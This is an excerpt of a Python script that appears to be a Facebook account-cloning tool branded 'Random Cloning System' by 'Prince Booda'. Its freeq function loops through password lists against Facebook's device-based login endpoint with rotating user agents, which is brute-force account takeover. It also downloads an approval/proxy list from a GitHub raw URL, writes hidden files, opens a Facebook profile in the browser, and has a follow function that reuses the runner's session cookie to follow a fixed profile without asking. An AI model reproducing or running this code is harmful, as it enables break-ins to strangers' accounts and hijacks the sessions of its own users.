...
twf = []
try:
    prox= requests.get('https://raw.githubusercontent.com/yasirazizo/Aprove/main/Aprove.txt ').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/yasirazizo/Aprove/blob/main/Aprove.txt ').text
        ua=open('.bbnew.txt','w')
...
try:
    prox= requests.get('https://raw.githubusercontent.com/yasirazizo/Aprove/main/Aprove.txt t').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM')
...
\033[1;90m                   TEAM BOODA& ZEA AND OMID
\033[1;91m             BOODA       \033[1;91m E
\033[1;93m           BOODA         \033[1;93m  N
\033[1;92m         BOODA           \033[1;92m D

\033[1;32m               \033[1;35mCREATED BY\33[0;m   :  \033[1;31mA.W.M\33[0;m\033[1;39m Pro \033[1;35mTeam\33[0;m
\033[1;32m               \033[1;32mAUTHOR       :  \033[1;32mPRINCE BOODA
\033[1;32m               \033[1;36mGITHUB       :  \033[1;33mPRINCE BOODA
...
clear()
os.system("xdg-open https://www.facebook.com/nooristan.nasari ")
xxxx = str(len(ugen))
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://x.facebook.com/subhanullah.niazay', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://x.facebook.com' + str(get)), cookies={'cookie': coki}).text
...
def main():
    ...
    print(f"\033[1;97m[02] \033[1;92mJOIN TO BOODA")
    print(f"\033[1;97m[03] \033[1;92m PRINE BOODA")
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://x.beta.facebook.com').text
            log_data = {
            ...
            "user-agent": pro}
            lo = session.post('https://x.beta.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
